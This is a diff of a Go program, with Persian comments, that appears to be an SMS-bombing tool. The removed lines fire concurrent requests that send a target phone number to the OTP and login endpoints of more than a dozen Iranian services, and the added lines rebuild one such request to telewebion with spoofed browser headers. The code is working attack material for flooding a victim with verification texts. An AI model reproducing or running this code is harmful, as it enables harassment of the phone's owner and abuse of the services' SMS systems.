@@ -700,136 +700,70 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
-				// anargift.com auth (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+wg.Add(1) // این درست است، تعداد وظایف اضافه شده را افزایش می دهد
+		tasks <- func() { // این تابع بی‌نام کار مربوط به این سرویس رو انجام میده
+            // --- خط کلیدی اضافه شده ---
+			defer wg.Done() // تضمین می کند که وقتی این تابع به پایان رسید، wg.Done() صدا زده شود
+            // --- پایان خط کلیدی اضافه شده ---
 
-		// anargift.com (JSON) - send_code
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+            fmt.Printf("\033[01;34m[Debug] Starting JSON task for URL: https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one\033[0m\n") // پیام شروع
 
-		// digitalsignup.snapp.ir (URL query) - ممکن است تکراری باشد
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{ // ارسال c
-					"cellphone": phone,
-				}, &wg, ch)
+			// ساختار payload به صورت JSON
+			payload := map[string]interface{}{
+				"code": "98",
+				"phone": getPhoneNumberNoZero(phone), // ارسال بدون صفر اول
+				"smsStatus": "default",
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
 
-		// digitalsignup.snapp.ir (JSON) - ممکن است تکراری باشد
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{ // ارسال c
-					"cellphone": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+            jsonData, err := json.Marshal(payload)
+            if err != nil {
+                fmt.Printf("\033[01;31m[-] Error while encoding JSON for telewebion.com: %v\033[0m\n", err)
+                ch <- http.StatusInternalServerError
+                fmt.Printf("\033[01;34m[Debug] Finishing JSON task for URL: https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one\033[0m\n") // پیام پایان (اگر در اینجا return می کند) - بهتر است فقط یک return باشد
+                return // مهم: حتما return کنید
+            }
 
-		// Snappfood (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				formData := url.Values{}
-				formData.Set("cellphone", phone)
-				sendFormRequest(c, ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch) // ارسال c
+			// ساخت درخواست با context و body
+			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", bytes.NewBuffer(jsonData))
+			if err != nil {
+				fmt.Printf("\033[01;31m[-] Error while creating request to telewebion.com: %v\033[0m\n", err)
+				ch <- http.StatusInternalServerError
+                fmt.Printf("\033[01;34m[Debug] Finishing JSON task for URL: https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one\033[0m\n") // پیام پایان (اگر در اینجا return می کند)
+				return // مهم: حتما return کنید
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
 
-		// khodro45.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{ // ارسال c
-					"mobile":      phone,
-					"device_type": 2,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+			// اضافه کردن هدرهای درخواستی
+            // توجه: User-Agent اینجا دستی تنظیم شده، از User-Agent تصادفی لیست استفاده نمی کند
+			req.Header.Set("Content-Type", "application/json")
+			req.Header.Set("Accept", "application/json, text/plain, */*")
+			req.Header.Set("Accept-Language", "en-US,en;q=0.9,fa;q=0.8")
+			req.Header.Set("Origin", "https://gate.telewebion.com")
+			req.Header.Set("Referer", "https://gate.telewebion.com/")
+			req.Header.Set("Sec-Ch-Ua", "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"")
+			req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+			req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
+			req.Header.Set("Sec-Fetch-Dest", "empty")
+			req.Header.Set("Sec-Fetch-Mode", "cors")
+			req.Header.Set("Sec-Fetch-Site", "same-site")
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36") // User-Agent دستی
 
-		// irantic.com (JSON) - ممکن است تکراری باشد
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
 
-		// basalam.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
+			// اجرای درخواست
+			resp, err := client.Do(req)
+			if err != nil {
+				fmt.Printf("\033[01;31m[-] Error sending request to telewebion.com: %v\033[0m\n", err)
+				ch <- http.StatusInternalServerError // ارسال کد خطا
+                fmt.Printf("\033[01;34m[Debug] Finishing JSON task for URL: https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one\033[0m\n") // پیام پایان (اگر در اینجا return می کند)
+				return // مهم: حتما return کنید
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+			defer resp.Body.Close() // بستن Body پاسخ پس از خروج تابع
 
-		// drnext.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+			// اگر تا اینجا رسید یعنی درخواست با موفقیت ارسال شده (حتی با کد وضعیت بالا)
+			ch <- resp.StatusCode // ارسال کد وضعیت دریافتی
+            // پیام پایان در این مسیر هم توسط defer چاپ می شود
+			// نیازی به return صریح اینجا نیست، تابع به پایان طبیعی خود می رسد
 
-		// digikalajet.ir (JSON) - ممکن است تکراری باشد
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{ // ارسال c
-					"phone": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
-
-		// caropex.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
-
-		// tetherland.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{ // ارسال c
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
-
-		// tandori.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.tandori.ir/client/users/login", map[string]interface{}{ // ارسال c
-					"phone": phone,
-				}, &wg, ch)
-			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}
 
 	}
 
